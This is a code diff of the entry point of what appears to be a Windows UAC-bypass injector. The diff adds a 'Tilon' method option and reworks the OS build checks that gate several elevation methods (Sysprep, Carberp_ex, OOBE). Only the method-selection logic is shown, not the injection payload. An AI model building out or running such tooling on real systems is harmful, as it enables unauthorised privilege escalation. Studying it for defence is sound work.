@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.30
+*  VERSION:     1.40
 *
-*  DATE:        30 Mar 2015
+*  DATE:        04 Apr 2015
 *
 *  Injector entry point.
 *
@@ -108,19 +108,39 @@ VOID main()
 			OutputDebugString(TEXT("[UCM] Method Carberp_ex selected\n\r"));
 			dwType = METHOD_CARBERP_EX;
 		}
+		if (lstrcmpi(szBuffer, TEXT("8")) == 0) {
+			OutputDebugString(TEXT("[UCM] Method Tilon selected\n\r"));
+			dwType = METHOD_TILON;
+		}
+
 	}
 
-	if ((dwType == METHOD_SYSPREP_EX) && (osver.dwBuildNumber < 9600)) {
-		MessageBox(GetDesktopWindow(), TEXT("This method is only for Windows 8.1 use"), 
-			PROGRAMTITLE, MB_ICONINFORMATION);
-		goto Done;
+	switch (dwType) {
+	case METHOD_TILON:
+	case METHOD_SYSPREP:
+		if (osver.dwBuildNumber > 9200) {
+			MessageBox(GetDesktopWindow(), TEXT("This method is only for pre Windows 8.1 use"),
+				PROGRAMTITLE, MB_ICONINFORMATION);
+			goto Done;
+		}
+		break;
+	case METHOD_SYSPREP_EX:
+		if (osver.dwBuildNumber < 9600) {
+			MessageBox(GetDesktopWindow(), TEXT("This method is only for Windows 8.1 use"),
+				PROGRAMTITLE, MB_ICONINFORMATION);
+			goto Done;
+		}
+		break;
+
 	}
+
 
 	switch (dwType) {
 
 	case METHOD_SYSPREP:
 	case METHOD_SYSPREP_EX:
 	case METHOD_OOBE:
+	case METHOD_TILON:
 
 		//
 		// Since we are using injection and not using heavens gate, we should ban usage under wow64.
